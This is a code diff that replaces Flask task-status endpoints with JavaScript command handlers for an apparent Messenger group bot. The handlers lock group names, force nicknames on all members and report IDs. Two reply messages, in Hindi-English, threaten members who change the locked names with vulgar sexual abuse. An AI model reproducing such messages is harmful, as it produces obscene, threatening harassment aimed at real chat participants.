-@app.route('/task_status', methods=['POST'])
-def task_status():
-    try:
-        task_key = request.json.get('task_key')
-        if task_key in active_tasks:
-            task = active_tasks[task_key]
-            return jsonify({
-                'success': True,
-                'status': task.current_status,
-                'sent_count': task.sent_count,
-                'is_running': task.is_running
-            })
-        else:
-            return jsonify({'success': False, 'message': 'Task not found'})
-    except Exception as e:
-        return jsonify({'success': False, 'message': f'Error: {str(e)}'})
+async function handleGroupCommand(api, event, args, isAdmin) {
+  try {
+    const { threadID, senderID } = event;
+    if (!isAdmin) {
+      const reply = await formatMessage(api, event, "Permission denied, you are not the admin.");
+      return await api.sendMessage(reply, threadID);
+    }
+    const subCommand = args.shift();
+    if (subCommand === 'on') {
+      const groupName = args.join(' ');
+      if (!groupName) {
+        const reply = await formatMessage(api, event, "Sahi format use karo: /group on <group_name>");
+        return await api.sendMessage(reply, threadID);
+      }
+      lockedGroups[threadID] = groupName;
+      await api.setTitle(groupName, threadID);
+      const reply = await formatMessage(api, event, `😈𝐆𝐑𝐎𝐔𝐏 𝐍𝐀𝐌𝐄 𝐋𝐎𝐂𝐊 𝐇𝐎 𝐆𝐀𝐘𝐀 𝐇𝐀𝐈 𝐀𝐁 𝐂𝐇𝐀𝐍𝐆𝐄 𝐊𝐀𝐑 𝐊𝐄 𝐃𝐈𝐊𝐇𝐀 𝐓𝐄𝐑𝐈 𝐆𝐀𝐀𝐍𝐃 𝐌𝐀𝐀𝐑 𝐋𝐔𝐆𝐀😈`);
+      await api.sendMessage(reply, threadID);
+    } else if (subCommand === 'off') {
+        delete lockedGroups[threadID];
+        const reply = await formatMessage(api, event, "Group name unlock ho gaya hai.");
+        await api.sendMessage(reply, threadID);
+    }
+  } catch (error) {
+    emitLog('❌ Error in handleGroupCommand: ' + error.message, true);
+    await api.sendMessage("Group name lock karne mein error aa gaya.", threadID);
+  }
+}
 
-@app.route('/get_active_tasks', methods=['GET'])
-def get_active_tasks():
-    tasks_info = []
-    for key, task in active_tasks.items():
-        tasks_info.append({
-            'task_key': key,
-            'status': task.current_status,
-            'sent_count': task.sent_count
-        })
-    return jsonify({'tasks': tasks_info})
+async function handleNicknameCommand(api, event, args, isAdmin) {
+  try {
+    const { threadID, senderID } = event;
+    if (!isAdmin) {
+      const reply = await formatMessage(api, event, "Permission denied, you are not the admin.");
+      return await api.sendMessage(reply, threadID);
+    }
+    const subCommand = args.shift();
+    if (subCommand === 'on') {
+      const nickname = args.join(' ');
+      if (!nickname) {
+        const reply = await formatMessage(api, event, "Sahi format use karo: /nickname on <nickname>");
+        return await api.sendMessage(reply, threadID);
+      }
+      lockedNicknames[threadID] = nickname;
+      const threadInfo = await api.getThreadInfo(threadID);
+      for (const pid of threadInfo.participantIDs) {
+        if (pid !== adminID) {
+          await api.changeNickname(nickname, threadID, pid);
+        }
+      }
+      const reply = await formatMessage(api, event, `😈𝐆𝐑𝐎𝐔𝐏 𝐊𝐀 𝐍𝐈𝐂𝐊 𝐍𝐀𝐌𝐄 𝐋𝐎𝐂𝐊 𝐇𝐎 𝐆𝐀𝐘𝐀 𝐇𝐀𝐈 𝐀𝐁 𝐂𝐇𝐀𝐍𝐆𝐄 𝐊𝐀𝐑 𝐊𝐄 𝐃𝐈𝐊𝐇𝐀 𝐓𝐄𝐑𝐈 𝐆𝐀𝐀𝐍𝐃 𝐌𝐀𝐀𝐑 𝐋𝐔𝐆𝐀😈`);
+      await api.sendMessage(reply, threadID);
+    } else if (subCommand === 'off') {
+        delete lockedNicknames[threadID];
+        const reply = await formatMessage(api, event, "Group ke sabhi nicknames unlock ho gaye hain.");
+        await api.sendMessage(reply, threadID);
+    }
+  } catch (error) {
+    emitLog('❌ Error in handleNicknameCommand: ' + error.message, true);
+    await api.sendMessage("Nickname lock karne mein error aa gaya.", threadID);
+  }
+}
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=False)
+async function handleBotNickCommand(api, event, args, isAdmin) {
+  const { threadID, senderID } = event;
+  if (!isAdmin) {
+    const reply = await formatMessage(api, event, "Permission denied, you are not the admin.");
+    return api.sendMessage(reply, threadID);
+  }
+  const newNickname = args.join(' ');
+  if (!newNickname) {
+    const reply = await formatMessage(api, event, "Sahi format use karo: /botnick <nickname>");
+    return api.sendMessage(reply, threadID);
+  }
+  botNickname = newNickname;
+  const botID = api.getCurrentUserID();
+  try {
+    // Save the new nickname to config.json
+    fs.writeFileSync('config.json', JSON.stringify({ botNickname: newNickname }, null, 2));
+    await api.changeNickname(newNickname, threadID, botID);
+    const reply = await formatMessage(api, event, `😈MERA NICKNAME AB ${newNickname} HO GAYA HAI BOSSS.😈`);
+    await api.sendMessage(reply, threadID);
+  } catch (e) {
+    emitLog('❌ Error setting bot nickname: ' + e.message, true);
+    const reply = await formatMessage(api, event, '❌ Error: Bot ka nickname nahi badal paya.');
+    await api.sendMessage(reply, threadID);
+  }
+}
+
+async function handleIDCommand(api, event, command) {
+  try {
+    const { threadID, senderID, mentions } = event;
+    if (command === 'tid') {
+      const reply = await formatMessage(api, event, `Group ID: ${threadID}`);
+      await api.sendMessage(reply, threadID);
+    } else if (command === 'uid') {
+      if (Object.keys(mentions || {}).length > 0) {
+        const mentionedID = Object.keys(mentions)[0];
+        const reply = await formatMessage(api, event, `User ID: ${mentionedID}`);
+        await api.sendMessage(reply, threadID);
+      } else {
